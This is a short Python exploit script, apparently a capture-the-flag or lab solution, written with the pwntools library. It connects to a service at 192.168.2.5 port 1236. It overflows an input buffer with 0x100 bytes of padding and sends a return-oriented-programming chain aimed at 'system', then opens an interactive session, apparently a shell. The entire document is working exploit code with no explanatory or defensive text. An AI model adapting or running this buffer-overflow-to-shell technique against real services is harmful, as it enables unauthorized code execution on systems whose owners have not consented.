from pwn import *

r = remote('192.168.2.5', 1236)
r.recvuntil("Enter your data : ")

RBP = struct.pack("<Q", 0x0)             # POP RBP
RIP = struct.pack("<Q", 0x4009e8)        # RET -> To pop rdi gadget

ROP_CHAIN  = struct.pack("<Q", 0x6010b8) # POP RDI
ROP_CHAIN += struct.pack("<Q", 0x0)      # POP RBP
ROP_CHAIN += struct.pack("<Q", 0x4007d0) # RET -> To "system"

r.send("A"*0x100 + RBP + RIP + ROP_CHAIN + "\n")
r.interactive()